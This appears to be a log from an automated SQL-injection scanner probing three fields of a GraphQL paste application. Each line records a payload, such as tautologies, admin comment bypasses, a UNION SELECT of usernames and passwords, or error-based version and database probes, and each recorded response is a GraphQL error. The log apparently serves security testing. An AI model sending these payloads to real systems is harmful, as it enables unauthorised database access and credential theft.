2026-02-02 23:16:05,278 | INFO    | InjectionTester      | union_select_123               | search.keyword       | POST | success  |  0.002s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 54}]}, {…]
2026-02-02 23:16:05,281 | INFO    | InjectionTester      | union_select_users             | search.keyword       | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 86}]}, {…]
2026-02-02 23:16:05,284 | INFO    | InjectionTester      | error_based_version            | search.keyword       | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 152}]}, …]
2026-02-02 23:16:05,286 | INFO    | InjectionTester      | error_based_extractvalue       | search.keyword       | POST | success  |  0.002s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 96}]}, {…]
2026-02-02 23:16:05,289 | INFO    | InjectionTester      | boolean_true                   | search.keyword       | POST | success  |  0.002s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 43}]}, {…]
2026-02-02 23:16:05,292 | INFO    | InjectionTester      | boolean_false                  | search.keyword       | POST | success  |  0.002s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 43}]}, {…]
2026-02-02 23:16:05,296 | INFO    | InjectionTester      | single_quote                   | me.token             | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 29}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,299 | INFO    | InjectionTester      | or_1_eq_1_dash                 | me.token             | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 39}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,302 | INFO    | InjectionTester      | or_string_eq                   | me.token             | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 39}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,305 | INFO    | InjectionTester      | double_quote_or                | me.token             | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:25) Expected :, found String\n\n1: query { me(token: \"\" OR \"\"=\"\") { id message error success } }\n                           ^\n", "locations": […]
2026-02-02 23:16:05,308 | INFO    | InjectionTester      | double_quote_1_eq_1            | me.token             | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:25) Expected :, found Int \"1\"\n\n1: query { me(token: \"\" OR 1=1 --\") { id message error success } }\n                           ^\n", "locations":…]
2026-02-02 23:16:05,311 | INFO    | InjectionTester      | or_1_eq_1_hash                 | me.token             | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 38}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,315 | INFO    | InjectionTester      | admin_comment_dash             | me.token             | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 37}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,318 | INFO    | InjectionTester      | admin_comment_hash             | me.token             | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 36}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,321 | INFO    | InjectionTester      | admin_comment_star             | me.token             | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 36}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,324 | INFO    | InjectionTester      | union_select_123               | me.token             | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 51}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,327 | INFO    | InjectionTester      | union_select_users             | me.token             | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,330 | INFO    | InjectionTester      | error_based_version            | me.token             | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 149}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locat…]
2026-02-02 23:16:05,333 | INFO    | InjectionTester      | error_based_extractvalue       | me.token             | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,336 | INFO    | InjectionTester      | boolean_true                   | me.token             | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 40}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,339 | INFO    | InjectionTester      | boolean_false                  | me.token             | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 40}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:05,343 | INFO    | InjectionTester      | single_quote                   | createPaste.content  | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 81}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,346 | INFO    | InjectionTester      | or_1_eq_1_dash                 | createPaste.content  | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,349 | INFO    | InjectionTester      | or_string_eq                   | createPaste.content  | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,352 | INFO    | InjectionTester      | double_quote_or                | createPaste.content  | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:51) Expected :, found String\n\n1: mutation { createPaste(burn: true, content: \"\" OR \"\"=\"\", public: true, title: \"test\") { id content title suc…]
2026-02-02 23:16:05,355 | INFO    | InjectionTester      | double_quote_1_eq_1            | createPaste.content  | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:51) Expected :, found Int \"1\"\n\n1: mutation { createPaste(burn: true, content: \"\" OR 1=1 --\", public: true, title: \"test\") { id content title s…]
2026-02-02 23:16:05,358 | INFO    | InjectionTester      | or_1_eq_1_hash                 | createPaste.content  | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 90}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,361 | INFO    | InjectionTester      | admin_comment_dash             | createPaste.content  | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 89}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,365 | INFO    | InjectionTester      | admin_comment_hash             | createPaste.content  | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,369 | INFO    | InjectionTester      | admin_comment_star             | createPaste.content  | POST | success  |  0.004s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,372 | INFO    | InjectionTester      | union_select_123               | createPaste.content  | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-02 23:16:05,376 | INFO    | InjectionTester      | union_select_users             | createPaste.content  | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 135}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-02 23:16:05,379 | INFO    | InjectionTester      | error_based_version            | createPaste.content  | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 201}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-02 23:16:05,382 | INFO    | InjectionTester      | error_based_extractvalue       | createPaste.content  | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 145}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-02 23:16:05,385 | INFO    | InjectionTester      | boolean_true                   | createPaste.content  | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 92}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
